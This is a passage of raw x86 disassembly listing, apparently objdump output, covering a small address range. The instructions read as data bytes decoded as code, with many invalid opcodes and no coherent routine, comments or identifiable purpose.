  416822:	mov    al,0x91
  416824:	pop    ecx
  416825:	mov    esp,0x31353ff7
  41682a:	push   0x78
  41682c:	inc    ebx
  41682d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41682e:	stos   BYTE PTR es:[edi],al
  41682f:	push   ds
  416830:	ficomp DWORD PTR [ebx+0x23]
  416833:	jmp    0xf8b5:0xff573d69
  41683a:	stos   DWORD PTR es:[edi],eax
  41683b:	dec    ebp
  41683c:	add    ch,BYTE PTR [eax-0x3b]
  41683f:	xor    edi,DWORD PTR gs:[edx+0x79]
  416843:	sub    ebp,DWORD PTR [ebp+0x1c]
  416846:	sahf   
  416847:	sub    BYTE PTR [esi-0x6],bh
  41684a:	fsub   DWORD PTR [edi]
  41684c:	cs or  eax,0x994a7a0a
  416852:	popf   
  416853:	sub    dl,ah
  416855:	push   edi
  416856:	imul   ecx,DWORD PTR [edi],0x2e
  416859:	ficom  WORD PTR [eax]
  41685b:	jge    0x4168b8
  41685d:	daa    
  41685e:	and    BYTE PTR [edx+0x48],0xc3
  416862:	sti    
  416863:	arpl   WORD PTR [eax+eiz*8+0x6c],sp
  416867:	mov    ebx,0xcd0d1d86
  41686c:	jle    0x4168cd
  41686e:	int3   
  41686f:	dec    edi
  416870:	test   DWORD PTR [edx+0x70],0x2e73526b
  416877:	clc    
  416878:	push   0xffffffb6
  41687a:	mov    ah,BYTE PTR [edi+0x29]
  41687d:	jg     0x4168bd
  41687f:	scas   eax,DWORD PTR es:[edi]
  416880:	xor    dl,dh
  416882:	popa   
  416883:	push   ds
  416884:	fild   DWORD PTR [ebp-0x47ea4e6e]
  41688a:	or     BYTE PTR [eax-0x19],ah
  41688d:	test   DWORD PTR [edi-0x2e],edi
  416890:	pop    ebx
  416891:	inc    ch
  416893:	ret    0x5a42
  416896:	and    ch,dh
  416898:	mov    bh,bl
  41689a:	leave  
  41689b:	mov    eax,ds:0x9b3e324a
  4168a0:	add    edi,DWORD PTR [eax+eiz*1+0x263eb452]
  4168a7:	sbb    ah,dl
  4168a9:	call   0xbdbd:0xac2bf883
  4168b0:	or     al,BYTE PTR [esi]
  4168b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168b3:	sar    esi,cl
  4168b5:	fidiv  WORD PTR [edx-0x3d]
  4168b8:	mov    al,0x54
  4168ba:	inc    eax
  4168bb:	fdivr  st(6),st
  4168bd:	push   edx
  4168be:	push   edx
  4168bf:	hlt    
  4168c0:	mov    dh,0xea
  4168c2:	lock loopne 0x416886
  4168c5:	dec    edi
  4168c6:	les    ecx,FWORD PTR [esp+ebx*1+0x7dada790]
  4168cd:	arpl   bx,cx
  4168cf:	stos   DWORD PTR es:[edi],eax
  4168d0:	cs loope 0x416901
  4168d3:	pop    ss
  4168d4:	pop    edx
  4168d5:	in     al,0x25
  4168d7:	retf   0x2643
  4168da:	bound  esi,QWORD PTR [edi+0x67b616f2]
  4168e0:	rcl    DWORD PTR [ecx],1
  4168e2:	adc    al,0xd7
  4168e4:	xchg   eax,ecx
  4168e6:	cmp    al,0x2a
  4168e8:	jo     0x41690e
  4168ea:	fs jmp 0xd8a:0x45f109d2
  4168f2:	and    eax,0x94d9f279
  4168f7:	cwde   
  4168f8:	mov    BYTE PTR [esi-0x1e8e3574],dh
  4168fe:	pop    esp
  4168ff:	lahf   
  416900:	stos   BYTE PTR es:[edi],al
  416901:	pop    ss
  416902:	pop    edi
  416903:	test   DWORD PTR [ecx],0x487b3cb7
  416909:	sub    ah,BYTE PTR [ebp-0x42]
  41690c:	mov    WORD PTR [ebx],fs
  41690e:	xlat   BYTE PTR ds:[ebx]
  41690f:	jp     0x41691d
  416911:	mov    edi,0xac957ac8
  416916:	push   ss
  416917:	push   ds
  416918:	sub    bl,0x80
  41691b:	sub    BYTE PTR [eax],0x2b
  41691e:	pop    ebx
  41691f:	rcl    BYTE PTR ss:[edx-0x3da3bb68],1
  416926:	cmp    ch,bh
  416928:	add    edi,ecx
  41692a:	mov    dl,0xed
  41692c:	adc    eax,0x619c443
  416931:	jne    0x416979
  416933:	outs   dx,DWORD PTR ds:[esi]
  416934:	(bad)  
  416935:	fsub   DWORD PTR [edx+ebx*4-0x64bc1886]
  41693c:	in     eax,0x9
  41693e:	call   0x4a297760
  416943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416944:	inc    ecx
  416945:	mov    bx,0x5998
  416949:	push   0x61
  41694b:	popf   
  41694c:	sti    
  41694d:	fwait
  41694e:	xor    bh,BYTE PTR [eax]
  416950:	pop    esi
  416951:	xchg   esi,eax
  416952:	push   edi
  416953:	cld    
  416954:	pop    edi
  416955:	jge    0x4168e3
  416957:	add    bl,BYTE PTR [eax-0x7ce2cb4b]
  41695d:	bound  edx,QWORD PTR [ebx]
  41695f:	je     0x416971
  416961:	cmp    eax,0xe0b74058
  416966:	sub    al,BYTE PTR [esi+0x2f]
  416969:	xor    DWORD PTR [edx+0x14],esp
  41696c:	shr    al,cl
  41696e:	sahf   
  41696f:	fisub  WORD PTR [edi+0x8f8ac79]
  416975:	out    dx,al
  416976:	adc    ebp,ebp
  416978:	and    bl,BYTE PTR [ecx+ebx*4]
  41697b:	out    dx,eax
  41697c:	pop    esi
  41697d:	push   edx
  41697e:	mov    esi,DWORD PTR [edi-0x79]
  416981:	retf   
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	pop    ebx
  416994:	mov    dl,0x5f
  416996:	or     al,0xa5
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x1d70707e
  4169a0:	cmp    al,0xaf
  4169a2:	ds mov ebp,0x88ea0452
  4169a8:	pop    es
  4169a9:	out    dx,eax
  4169aa:	aaa    
  4169ab:	scas   eax,DWORD PTR es:[edi]
  4169ac:	adc    DWORD PTR [eax-0x1d8601c2],0x22
  4169b3:	imul   ebp,DWORD PTR [esi],0xec2ecb40
  4169b9:	push   esi
  4169ba:	xor    bh,dh
  4169bc:	xchg   ecx,eax
  4169bd:	cmc    
  4169be:	imul   ebp,DWORD PTR [eax-0xd],0x2dfe9462
  4169c5:	out    dx,al
  4169c6:	xor    al,0x9b
  4169c8:	lods   al,BYTE PTR ds:[esi]
  4169c9:	pop    edx
  4169ca:	daa    
  4169cb:	pop    ds
  4169cc:	sub    ebx,eax
  4169ce:	add    dh,BYTE PTR [edi+0x1a62189d]
  4169d4:	gs ds mov bl,0xa7
  4169d8:	xchg   ebp,eax
  4169d9:	push   ss
  4169da:	leave  
  4169db:	(bad)  
  4169dc:	and    al,0x9e
  4169de:	xchg   ebp,eax
  4169df:	jbe    0x4169d2
  4169e1:	loopne 0x4169c0
  4169e3:	stc    
  4169e4:	ds inc esp
  4169e6:	inc    ecx
  4169e7:	daa    
  4169e8:	ds xchg esp,eax
  4169ea:	stc    
  4169eb:	pusha  
  4169ec:	inc    edx
  4169ed:	in     eax,0x67
  4169ef:	push   ebp
  4169f0:	sub    bh,BYTE PTR [ebp-0x54]
  4169f3:	les    ebp,FWORD PTR [ecx-0x3f]
  4169f6:	pop    ebp
  4169f7:	dec    edx
  4169f8:	pop    ecx
  4169f9:	inc    eax
  4169fa:	scas   al,BYTE PTR es:[edi]
  4169fb:	or     eax,0x64dfc505
  416a00:	add    BYTE PTR [eax+0x73],ah
  416a03:	xor    al,0x58
  416a05:	rol    BYTE PTR [edx-0x6b],0xb2
  416a09:	outs   dx,DWORD PTR ds:[esi]
  416a0a:	dec    edi
  416a0b:	add    BYTE PTR [esi+edx*4-0x42bed102],dh
  416a12:	push   ebx
  416a13:	add    eax,esp
  416a15:	mov    WORD PTR [eax+0x2cc71883],ss
  416a1b:	int    0xef
  416a1d:	jmp    0x4169fa
  416a1f:	or     dl,BYTE PTR [ebx+0x4fbedd9c]
  416a25:	dec    edx
  416a26:	xchg   ecx,eax
  416a27:	push   cs
  416a28:	pop    ebx
  416a29:	shl    BYTE PTR [ebp-0x7f0ce1c2],cl
  416a2f:	xchg   esp,eax
  416a30:	and    BYTE PTR [ecx+0x6bc19e50],0x18
  416a37:	pop    esp
  416a38:	jecxz  0x4169ee
  416a3a:	outs   dx,BYTE PTR ds:[esi]
  416a3b:	sahf   
  416a3c:	jae    0x416a3e
  416a3e:	bnd ret 
  416a40:	sbb    al,0x80
  416a42:	out    0xd2,eax
  416a44:	pop    ebx
  416a45:	cmc    
  416a46:	sbb    DWORD PTR [ebp-0x7a],edi
  416a49:	and    DWORD PTR [ebx],edi
  416a4b:	jnp    0x4169d6
  416a4d:	jne    0x4169f4
  416a4f:	mov    bh,0xe4
  416a51:	sbb    esi,esi
  416a53:	mov    dh,0xcb
  416a55:	dec    ebx
  416a56:	ret    
  416a57:	adc    cl,cl
  416a59:	dec    edx
  416a5a:	(bad)  [ebx-0x49]
  416a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a5e:	in     eax,0xc7
  416a60:	fsub   DWORD PTR [eax+0x65]
  416a63:	popa   
  416a64:	mov    WORD PTR [edx+ecx*1+0x6a],es
  416a68:	pop    ecx
  416a69:	xchg   BYTE PTR [edx],ch
  416a6b:	adc    al,0xaf
  416a6d:	popa   
  416a6e:	sahf   
  416a6f:	lods   eax,DWORD PTR ds:[esi]
  416a70:	pop    esi
  416a71:	mov    cl,0xba
  416a73:	pusha  
  416a74:	ds nop
  416a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a77:	jecxz  0x416a18
  416a79:	ins    DWORD PTR es:[edi],dx
  416a7a:	in     al,0xa0
  416a7c:	dec    esi
  416a7d:	(bad)  [edi]
  416a7f:	nop
  416a80:	push   ebp
  416a81:	stos   DWORD PTR es:[edi],eax
  416a82:	push   eax
  416a83:	stc    
  416a84:	out    0xa9,eax
  416a86:	push   edi
  416a87:	push   ss
  416a88:	jnp    0x416ae6
  416a8a:	addr16 mov ebp,0x95a34855
  416a90:	clc    
  416a91:	test   al,bl
  416a93:	icebp  
  416a94:	mov    es:0x10165fe7,al
  416a9a:	mov    eax,ds:0x2d220ef9
  416a9f:	popf   
  416aa0:	ror    edi,1
  416aa2:	(bad)  [ebx]
  416aa4:	xor    dl,BYTE PTR [eax+0x7c]
  416aa7:	mov    esp,0x9f16dcd6
  416aac:	push   0xc86b11c4
  416ab1:	adc    eax,0xeb9a0c7
  416ab6:	jge    0x416a93
  416ab8:	add    BYTE PTR [ebx+0x1eb1fe90],bh
  416abe:	cdq    
  416abf:	fwait
  416ac0:	mov    bl,0xa9
  416ac2:	fidivr DWORD PTR [eax-0x129a81f6]
  416ac8:	pop    ebx
  416ac9:	jle    0x416a86
  416acb:	mov    ds:0x4093a623,eax
  416ad0:	in     eax,0x4d
  416ad2:	ins    BYTE PTR es:[edi],dx
  416ad3:	push   ebp
  416ad4:	xchg   esp,eax
  416ad5:	cmp    BYTE PTR [edx],al
  416ad7:	adc    BYTE PTR ds:0xc0ce1c23,bh
  416add:	sbb    eax,0x4de71b24
  416ae2:	clc    
  416ae3:	pop    eax
  416ae4:	es mov bl,0x4f
  416ae7:	div    BYTE PTR [edx-0x72]
  416aea:	jmp    0x825a:0x8a324609
  416af1:	pop    esi
  416af2:	mov    ch,bl
  416af4:	pushf  
  416af5:	adc    esp,0x31
  416af8:	js     0x416ac0
  416afa:	cwde   
  416afb:	sbb    al,0x61
  416afd:	mov    ds:0xfdf4b57c,eax
  416b02:	stos   DWORD PTR es:[edi],eax
  416b03:	cmc    
  416b04:	mov    eax,ds:0x2698cab2
  416b09:	mov    ebx,0xe15980be
  416b0e:	push   eax
  416b0f:	adc    al,0xc5
  416b11:	inc    edx
  416b12:	xor    eax,0x50ac5205
  416b17:	lods   eax,DWORD PTR ds:[esi]
  416b18:	repnz dec edi
  416b1a:	add    ch,BYTE PTR [ecx+0x2848633f]
  416b20:	sub    al,BYTE PTR [ebp-0x7a3651b8]
  416b26:	ror    BYTE PTR [ebx],1
  416b28:	sbb    al,0xd9
  416b2a:	sub    al,ch
  416b2c:	push   edi
  416b2d:	pop    esi
  416b2e:	retf   0x8548
  416b31:	shl    dh,cl
  416b33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b34:	repz sbb esi,0xffffffdf
  416b38:	or     ebp,DWORD PTR [edx+eiz*4-0x1a320c46]
  416b3f:	mov    esp,0xe15dfc1a
  416b44:	jo     0x416ba4
  416b46:	idiv   BYTE PTR [esi-0x6]
  416b49:	jae    0x416b0a
  416b4b:	push   ecx
  416b4c:	mov    ?,WORD PTR ds:0x8da1cdb2
  416b52:	mov    dh,0xfc
  416b54:	pop    ebx
  416b55:	dec    ebx
  416b56:	repz ds xor al,0x2a
  416b5a:	or     eax,0xab49b9b1
  416b5f:	xchg   edx,eax
  416b60:	imul   ecx,ebx,0xb
  416b63:	cmp    al,BYTE PTR [ecx]
  416b65:	cld    
  416b66:	idiv   DWORD PTR [eax-0x32]
  416b69:	jecxz  0x416af0
  416b6b:	jb     0x416bcb
  416b6d:	sbb    BYTE PTR ds:0x4194add2,ch
  416b73:	xor    DWORD PTR [esi+ebp*1-0x66b32e61],esp
  416b7a:	aas    
  416b7b:	or     dl,BYTE PTR [ecx-0x60]
  416b7e:	mov    dl,0x54
  416b80:	jge    0x416b6c
  416b82:	mov    al,ds:0x1ab03106
  416b87:	(bad)  
  416b88:	cwde   
  416b89:	test   BYTE PTR fs:[ecx-0x22],dh
  416b8d:	repz adc bl,BYTE PTR [edx]
  416b90:	loopne 0x416bf6
  416b92:	faddp  st(4),st
  416b94:	jl     0x416b4b
  416b96:	push   es
  416b97:	jno    0x416b65
  416b99:	or     BYTE PTR [esi-0x3f],0x42
  416b9d:	jb     0x416b9d
  416b9f:	sub    bl,ah
  416ba1:	sahf   
  416ba2:	in     eax,dx
  416ba3:	mov    eax,0x55ed4ed0
  416ba8:	pop    ss
  416ba9:	lods   al,BYTE PTR ds:[esi]
  416baa:	das    
  416bab:	mov    ah,BYTE PTR [edi]
  416bad:	mov    ds:0xd324a3,al
  416bb2:	cmp    ebx,esi
  416bb4:	aaa    
  416bb5:	inc    eax
  416bb6:	lods   al,BYTE PTR ds:[esi]
  416bb7:	add    bh,ah
  416bb9:	ror    BYTE PTR [ebx+0x4a9ca38b],1
  416bbf:	ror    DWORD PTR [edi-0x6a48ec56],cl
  416bc5:	nop
  416bc6:	and    al,0x2a
  416bc8:	or     esp,DWORD PTR [esi-0x1f298158]
  416bce:	into   
  416bcf:	mov    eax,0x2c1e9045
  416bd4:	mov    eax,0xd54da0d4
  416bd9:	sbb    al,0xca
  416bdb:	add    eax,DWORD PTR [ebx+0x43]
  416bde:	mov    ch,0xe3
  416be0:	(bad)  
  416be2:	push   esp
  416be3:	adc    al,0x13
  416be5:	sti    
  416be6:	out    0x3a,eax
  416be8:	lock js 0x416c47
  416beb:	mov    ah,0x20
  416bed:	or     DWORD PTR [edx],edi
  416bef:	mov    ecx,0x45dd77e4
  416bf4:	idiv   BYTE PTR [eax+0x24b4c9d6]
  416bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bfb:	sub    ch,BYTE PTR [esi+0x4b]
  416bfe:	xor    ecx,DWORD PTR [ecx]
  416c00:	mov    al,ds:0x94fd359c
  416c06:	test   al,0xb8
  416c08:	xchg   ebp,eax
  416c09:	inc    esi
  416c0a:	std    
  416c0b:	xchg   ebp,eax
  416c0c:	enter  0x3754,0xb1
  416c10:	and    eax,0xf39dcd2a
  416c15:	pop    ecx
  416c16:	repnz cli 
  416c18:	scas   al,BYTE PTR es:[edi]
  416c19:	add    BYTE PTR cs:[eax+0x653bd276],ah
  416c20:	lock xor ebx,DWORD PTR [ecx+0x735fde8d]
  416c27:	retf   0x1369
  416c2a:	aam    0xa7
  416c2c:	sub    al,0xca
  416c2e:	enter  0xb389,0x76
  416c32:	or     BYTE PTR [eax],bh
  416c34:	fidiv  DWORD PTR [ecx-0x6c]
  416c37:	out    dx,al
  416c38:	mov    bl,0xbd
  416c3a:	or     ecx,DWORD PTR [edi-0x28]
  416c3d:	iret   
  416c3e:	out    0x3e,eax
  416c40:	(bad)  
  416c41:	jmp    FWORD PTR [edx+0x64]
  416c44:	dec    esi
  416c45:	cmc    
  416c46:	mov    esp,DWORD PTR [ebx]
  416c48:	pushf  
  416c49:	pop    ss
  416c4a:	aad    0x3c
  416c4c:	ins    DWORD PTR es:[edi],dx
  416c4d:	push   eax
  416c4e:	push   ds
  416c4f:	sbb    BYTE PTR [edx+0x6a],al
  416c52:	xchg   edi,eax
  416c53:	and    DWORD PTR [ebp+0x71ce2bbf],edx
  416c59:	sbb    DWORD PTR [eax-0x4f7b562b],eax
  416c5f:	sub    DWORD PTR [edi-0x4],edx
  416c62:	hlt    
  416c63:	test   BYTE PTR [edi+0x54],bl
  416c66:	dec    ecx
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	stos   BYTE PTR es:[edi],al
  416c7c:	clc    
  416c7d:	cmp    al,0xab
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c68
  416c88:	pop    ss
  416c89:	jno    0x416cc9
  416c8b:	xchg   ebx,eax
  416c8c:	mov    BYTE PTR [esi],ah
  416c8e:	mov    esi,0xa5f742e0
  416c93:	or     bh,ch
  416c95:	mov    ecx,0x3ed00698
  416c9a:	xchg   esi,eax
  416c9b:	add    eax,0x97303795
  416ca0:	mov    bh,0x7
  416ca2:	add    al,0xc6
  416ca4:	sbb    eax,0xf888abbd
  416ca9:	(bad)  
  416caa:	call   0xf42756b0
  416caf:	stc    
  416cb0:	fidivr WORD PTR cs:[edx+0x2cd86609]
  416cb7:	mov    ds:0x3480a3d1,eax
  416cbc:	lea    ebx,[eax+0x14]
  416cbf:	xor    DWORD PTR [eax+0x70473060],ebp
  416cc5:	outs   dx,BYTE PTR ds:[esi]
  416cc6:	cmc    
  416cc7:	ffree  st(2)
  416cc9:	and    DWORD PTR [ebx+0x2c],ebx
  416ccc:	popf   
  416ccd:	enter  0x1f11,0xb
  416cd1:	push   edi
  416cd2:	adc    al,0xb7
  416cd4:	mov    esp,0x9b719396
  416cd9:	dec    edi
  416cda:	jns    0x416d39
  416cdc:	cmp    ah,bh
  416cde:	daa    
  416cdf:	daa    
  416ce0:	lahf   
  416ce1:	jbe    0x416d4e
  416ce3:	sub    BYTE PTR [ebx-0x1d],bl
  416ce6:	xor    al,0xe7
  416ce8:	rol    BYTE PTR [edx],0x27
  416ceb:	pop    ds
  416cec:	addr16 ss pop edi
  416cef:	les    eax,FWORD PTR [eax-0x5288901b]
  416cf5:	adc    edi,DWORD PTR [ebp+0x6f7ba211]
  416cfb:	daa    
  416cfc:	push   ds
  416cfd:	cwde   
  416cfe:	fdivr  DWORD PTR [ebp-0x3da0bdc5]
  416d04:	mov    ebp,0xa45da123
  416d09:	repz sar BYTE PTR [eax-0x680468fb],1
  416d10:	and    eax,0xf33fecca
  416d15:	xlat   BYTE PTR ds:[ebx]
  416d16:	dec    edi
  416d17:	dec    ebp
  416d18:	test   DWORD PTR [edx-0x1cfb05e3],esp
  416d1e:	xchg   edi,eax
  416d1f:	add    DWORD PTR [eax+0x68edd911],ebp
  416d25:	addr16 in al,dx
  416d27:	rcr    BYTE PTR [ebx],cl
  416d29:	xor    DWORD PTR [ecx+0x7c],ebx
  416d2c:	(bad)  
  416d2d:	mov    edi,0x2dded177
  416d32:	add    edx,DWORD PTR [esi-0x1d]
  416d35:	inc    sp
  416d37:	mov    eax,ds:0xf248320c
  416d3c:	ror    BYTE PTR [ebp+ebp*2+0x66],cl
  416d40:	mov    ds:0xaf01f52c,eax
  416d45:	aas    
  416d46:	int    0xe7
  416d48:	adc    BYTE PTR [ecx+eiz*8],cl
  416d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d4c:	loopne 0x416db9
  416d4e:	frstor [ebp+eiz*1+0x5faa3854]
  416d55:	lea    eax,[edx+0x7f41e4d5]
  416d5b:	pop    edx
  416d5c:	ins    BYTE PTR es:[edi],dx
  416d5d:	jno    0x416d4e
  416d5f:	or     al,0x9
  416d61:	push   ss
  416d62:	retf   0x40d4
  416d65:	jp     0x416d9a
  416d67:	add    bl,ah
  416d69:	lea    edi,[edi+0x4b41b4b7]
  416d6f:	std    
  416d70:	push   ebp
  416d71:	mov    dl,0xa5
  416d73:	pop    esp
  416d74:	pop    esi
  416d75:	int3   
  416d76:	outs   dx,DWORD PTR ds:[esi]
  416d77:	out    dx,al
  416d78:	into   
  416d79:	push   ebp
  416d7a:	sbb    ecx,DWORD PTR [ebx-0x41]
  416d7d:	enter  0xde17,0x68
  416d81:	dec    esp
  416d82:	dec    ebx
  416d83:	sbb    esp,DWORD PTR [ebx-0x5a6649a3]
  416d89:	and    edi,ebx
  416d8b:	mov    al,ds:0xde4ad0a1
  416d90:	mov    ecx,esi
  416d92:	imul   ecx,DWORD PTR [eax-0x349ba464],0x9fb467a5
  416d9c:	(bad)  
  416d9e:	or     ch,bl
  416da0:	pop    edi
  416da1:	lahf   
  416da2:	jg     0x416db0
  416da4:	push   esp
  416da5:	aam    0x26
  416da7:	sub    dl,dh
  416da9:	inc    ebp
  416daa:	adc    DWORD PTR [ebp-0x423f8ffc],ebx
  416db0:	mov    dl,0xfc
  416db2:	cld    
  416db3:	retf   0x8bb4
  416db6:	sub    al,0xdd
  416db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416db9:	or     edx,esi
  416dbb:	test   eax,0x4b30e4d9
  416dc0:	mov    ah,BYTE PTR [edx+0x767ee972]
  416dc6:	loop   0x416d4f
  416dc8:	jl     0x416d6d
  416dca:	inc    eax
  416dcb:	fidiv  DWORD PTR [eax+0x3d]
  416dce:	or     DWORD PTR [edx],edx
  416dd0:	iret   
  416dd1:	sbb    DWORD PTR [edi-0x7d],esp
  416dd4:	in     al,dx
  416dd5:	jmp    0xb04e14cc
  416dda:	mov    bl,0x9d
  416ddc:	rol    BYTE PTR [eax+0x73],0x3a
  416de0:	or     dl,BYTE PTR [ebx]
  416de2:	mov    al,0x4
  416de4:	repnz in eax,0x3e
  416de7:	imul   edi,DWORD PTR [edi],0xf
  416dea:	hlt    
  416deb:	pop    ebx
  416dec:	xchg   ebp,eax
  416ded:	pop    esp
  416dee:	test   al,0x4e
  416df0:	xchg   edx,eax
  416df1:	std    
  416df2:	mov    edx,0x5cf113bc
  416df7:	scas   al,BYTE PTR es:[edi]
  416df8:	jmp    0xe68e:0x1cea6e70
  416dff:	cmp    BYTE PTR [eax-0x2f],0xaf
  416e03:	mov    ebp,0xddd3ad74
  416e08:	push   ebx
  416e09:	fild   WORD PTR [ebx+0x2ce6d842]
  416e0f:	adc    esi,DWORD PTR [ecx+0x53]
  416e12:	jb     0x416dc9
  416e14:	aas    
  416e15:	dec    esi
  416e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e17:	jb     0x416e43
  416e19:	jmp    0xacbe:0x9981f788
  416e20:	mov    esi,0x1b64941
  416e25:	push   edi
  416e26:	jmp    0xa57:0x1bd0b6aa
  416e2d:	push   es
  416e2e:	ret    0x48a6
  416e31:	mov    gs,WORD PTR [esi]
  416e33:	jae    0x416dbc
  416e35:	push   ebp
  416e36:	adc    al,0x1c
  416e38:	sbb    DWORD PTR [ebx-0x40],0xffffffcf
  416e3c:	inc    ebp
  416e3d:	fisttp DWORD PTR [ebp-0x1e]
  416e40:	aad    0x9e
  416e42:	fwait
  416e43:	out    dx,al
  416e44:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e46:	push   ebp
  416e47:	jmp    0xbdf2:0xf3bdeafb
  416e4e:	clc    
  416e4f:	cmp    eax,0x644cf83d
  416e54:	inc    eax
  416e55:	dec    esi
  416e56:	sbb    dh,bl
  416e58:	in     eax,0xd6
  416e5a:	popa   
  416e5b:	adc    dl,BYTE PTR [edx+0x53]
  416e5e:	pop    esi
  416e5f:	mov    ah,BYTE PTR [eax-0x6b]
  416e62:	out    dx,al
  416e63:	xchg   esi,eax
  416e64:	xchg   edi,eax
  416e65:	cmp    ah,BYTE PTR [eax+edx*2-0x164c03d0]
  416e6c:	xlat   BYTE PTR ds:[ebx]
  416e6d:	push   ds
  416e6e:	out    dx,al
  416e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e70:	lock cmp al,BYTE PTR [edx-0x39]
  416e74:	push   eax
  416e75:	add    eax,0xba01b9c0
  416e7a:	cmp    cl,bl
  416e7c:	clc    
  416e7d:	fs xchg edx,eax
  416e7f:	sbb    esi,DWORD PTR [edi-0x58]
  416e82:	jne    0x416e12
  416e84:	jle    0x416e75
  416e86:	in     al,dx
  416e87:	dec    ebp
  416e88:	adc    dl,BYTE PTR [ebp+edi*8+0x38]
  416e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8d:	adc    ah,bl
  416e8f:	pop    ds
  416e90:	and    ebp,DWORD PTR [ebp-0x1e]
  416e93:	cld    
  416e94:	loopne 0x416ed3
  416e96:	mov    DWORD PTR [edx-0x4e],esi
  416e99:	pop    edi
  416e9a:	ja     0x416e5a
  416e9c:	pop    ebp
  416e9d:	dec    ebp
  416e9e:	or     DWORD PTR [ebx+esi*4+0x25743389],ecx
  416ea5:	jmp    0xaa848e29
  416eaa:	dec    ecx
  416eab:	fcomip st,st(3)
  416ead:	clc    
  416eae:	fist   WORD PTR [esi]
  416eb0:	sub    bl,BYTE PTR [esi-0x14]
  416eb3:	loope  0x416ef4
  416eb5:	ret    0xe870
  416eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eb9:	inc    esi
  416eba:	pop    eax
  416ebb:	fnstsw WORD PTR [edi]
  416ebd:	scas   eax,DWORD PTR es:[edi]
  416ebe:	ss pop ecx
  416ec0:	dec    ebx
  416ec1:	loop   0x416efa
  416ec3:	mov    es,WORD PTR [ecx-0x40]
  416ec6:	cmp    al,0x75
  416ec8:	cmp    bh,dl
  416eca:	xchg   ebp,eax
  416ecb:	or     eax,0x37ca72b4
  416ed0:	fidivr DWORD PTR [ebx]
  416ed2:	ret    0x31ba
  416ed5:	js     0x416f1c
  416ed7:	jns    0x416f1d
  416ed9:	jmp    0x416f55
  416edb:	mov    ch,0xe7
  416edd:	mov    dh,0xfc
  416edf:	jno    0x416ec6
  416ee1:	mov    bh,0x5f
  416ee3:	xor    eax,0x24f8f45b
  416ee8:	push   ds
  416ee9:	in     eax,0x9b
  416eeb:	fisttp WORD PTR [ebx+eax*1]
  416eee:	push   edx
  416eef:	pop    eax
  416ef0:	pop    eax
  416ef1:	aas    
  416ef2:	pop    eax
  416ef3:	xchg   esp,eax
  416ef4:	mov    eax,0xa970baf9
  416ef9:	sub    eax,0xc15d23fb
  416efe:	adc    bl,BYTE PTR [ebx-0x15]
  416f01:	mov    cl,BYTE PTR [edx+0x3a]
  416f04:	call   0xcb7f53ad
  416f09:	pop    es
  416f0a:	test   al,0x9
  416f0c:	setns  cl
  416f0f:	shl    DWORD PTR [ecx-0x5d7a8df5],cl
  416f15:	(bad)  
  416f16:	aad    0xaa
  416f18:	dec    ebx
  416f19:	arpl   WORD PTR [ecx+0x6757aa31],ax
  416f1f:	aam    0xc7
  416f21:	push   ecx
  416f22:	xor    eax,0xa5a5767a
  416f27:	cmp    bh,BYTE PTR [ebp-0x3ea3bf2b]
  416f2d:	jns    0x416ed5
  416f2f:	push   edi
  416f30:	in     eax,0xdf
  416f32:	sbb    ebp,ebx
  416f34:	loop   0x416f0b
  416f36:	xchg   esi,eax
  416f37:	mov    BYTE PTR [ebp-0x49],ch
  416f3a:	jae    0x416f29
  416f3c:	xor    ecx,ecx
  416f3e:	sub    ch,al
  416f40:	mov    esp,0x4cf80452
  416f45:	xchg   ebp,eax
  416f46:	call   0x2a5f:0x5bd67768
  416f4d:	or     cl,BYTE PTR [edi]
  416f4f:	scas   eax,DWORD PTR es:[edi]
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	pop    es
  416f6b:	or     DWORD PTR [edi],ebx
  416f6d:	mov    dl,0x37
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xb370707e
  416f77:	xchg   ebp,eax
  416f78:	fdivp  st(5),st
  416f7a:	(bad)  
  416f7d:	outs   dx,DWORD PTR ds:[esi]
  416f7e:	or     eax,0x82f94268
  416f83:	hlt    
  416f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f85:	scas   al,BYTE PTR es:[edi]
  416f86:	jb     0x416f3c
  416f88:	fsub   DWORD PTR [ebx]
  416f8a:	and    al,0xb8
  416f8c:	sbb    eax,0x5743bb7e
  416f91:	mov    ds:0x17b26b76,al
  416f96:	pop    ds
  416f97:	xor    esp,esi
  416f99:	(bad)  
  416f9b:	stos   BYTE PTR es:[edi],al
  416f9c:	sub    ebx,DWORD PTR [ebx-0x46]
  416f9f:	mov    ebp,0x2c466687
  416fa4:	setge  cl
